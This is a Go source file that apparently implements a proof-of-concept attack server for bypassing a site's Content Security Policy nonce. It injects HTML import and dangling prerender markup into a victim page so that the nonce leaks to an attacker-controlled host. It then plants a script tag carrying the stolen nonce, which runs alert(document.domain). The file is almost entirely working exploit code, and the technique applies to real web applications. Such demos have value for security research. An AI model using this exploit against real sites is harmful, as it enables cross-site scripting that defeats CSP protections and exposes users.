package evil

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

const (
	victimBaseUri = "http://victim-csp.buglloc.com:9001"
	evilBaseUri   = "http://evil-csp.buglloc.com:9001"
)

var nonceRe = regexp.MustCompile(`nonce=%22(\w+-\w+-\w+-\w+-\w+)%22`)

func updateMessage(id string, content string) {
	form := url.Values{
		"content": {content},
	}
	res, err := http.DefaultClient.PostForm(fmt.Sprintf("%s/message/%s", victimBaseUri, id), form)
	if err == nil {
		res.Body.Close()
	}
}

func NewEvilRouter() http.Handler {
	r := gin.Default()
	r.LoadHTMLGlob("templates/evil/*")
	r.GET("/", func(c *gin.Context) {
		c.HTML(200, "index.html", nil)
	})
	r.GET("/start", func(c *gin.Context) {
		id := uuid.New().String()
		targetUrl := fmt.Sprintf("%s/message/%s", victimBaseUri, id)
		content := ""
		for i := 0; i < 20; i++ {
			content += fmt.Sprintf(`<link rel="import" href="%s?&%d" async>`,
				targetUrl, i)
		}
		content += fmt.Sprintf("<link rel='prerender' href='%s/update-nonce/%s?a=", evilBaseUri, id)
		updateMessage(id, content)
		c.Redirect(302, targetUrl)
	})
	r.GET("/update-nonce/:uuid", func(c *gin.Context) {
		matches := nonceRe.FindStringSubmatch(c.Request.RequestURI)
		if len(matches) > 1 {
			updateMessage(c.Param("uuid"), fmt.Sprintf(`<script nonce="%s">alert(document.domain)</script>`, matches[1]))
		}
		c.JSON(200, gin.H{})
	})
	return r
}
